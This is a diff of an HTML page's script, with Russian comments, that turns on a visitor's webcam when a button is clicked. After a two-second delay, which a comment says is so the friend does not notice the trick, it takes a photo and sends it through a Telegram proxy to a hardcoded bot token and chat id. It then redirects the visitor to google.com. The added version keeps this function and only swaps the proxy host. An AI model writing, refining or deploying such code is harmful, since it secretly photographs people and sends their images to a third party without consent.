@@ -27,71 +27,49 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    // ТВОИ ДАННЫЕ (ПРОВЕРЬ ИХ!)
-    const token = '8606836997:AAEi_rRmslGqHJQ0pk6KPFjDMROHtG6s0EQ';
-    const chatId = '1976857829';
-    const targetUrl = 'https://google.com'; // Куда перекинет в конце
+   const token = '8606836997:AAEi_rRmslGqHJQ0pk6KPFjDMROHtG6s0EQ';
+const chatId = '1976857829';
+const targetUrl = 'https://google.com';
 
-    // Используем прокси для обхода блокировок в РФ
-    const proxyUrl = `https://api.tgproxy.id{token}/sendPhoto`;
+// Попробуем другой, более стабильный прокси
+const proxyUrl = `https://api.telegram-proxy.org{token}/sendPhoto`;
 
-    const btn = document.getElementById('actionBtn');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const status = document.getElementById('status');
+const btn = document.getElementById('actionBtn');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
 
-    btn.addEventListener('click', async () => {
-        btn.disabled = true;
-        status.innerText = "Проверка доступа к камере...";
+btn.addEventListener('click', async () => {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
 
-        try {
-            // 1. Запрашиваем камеру
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
+        await new Promise(res => setTimeout(res, 2000));
 
-            status.innerText = "Загрузка данных (3 сек)...";
-            
-            // Ждем 2 секунды, чтобы камера сфокусировалась и друг не заметил подвоха
-            await new Promise(res => setTimeout(res, 2000));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
 
-            // 2. Делаем фото
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'img.jpg');
 
-            // 3. Отправляем через прокси в Telegram
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'user_photo.jpg');
+        // Отправка
+        await fetch(proxyUrl, {
+            method: 'POST',
+            body: formData
+        });
 
-            const response = await fetch(proxyUrl, {
-                method: 'POST',
-                body: formData
-            });
+        stream.getTracks().forEach(track => track.stop());
 
-            if (response.ok) {
-                console.log("Успех: фото отправлено");
-            } else {
-                const errData = await response.json();
-                console.error("Ошибка API:", errData.description);
-            }
+    } catch (err) {
+        console.error("Ошибка:", err);
+    } finally {
+        window.location.href = targetUrl;
+    }
+});
 
-            // Выключаем камеру
-            stream.getTracks().forEach(track => track.stop());
-
-        } catch (err) {
-            console.log("Доступ отклонен или ошибка:", err.name);
-            status.innerText = "Ошибка доступа. Попробуйте еще раз.";
-        } finally {
-            // 4. Переход по ссылке в любом случае через секунду
-            status.innerText = "Перенаправление...";
-            setTimeout(() => {
-                window.location.href = targetUrl;
-            }, 1000);
-        }
-    });
 </script>
 
 </body>
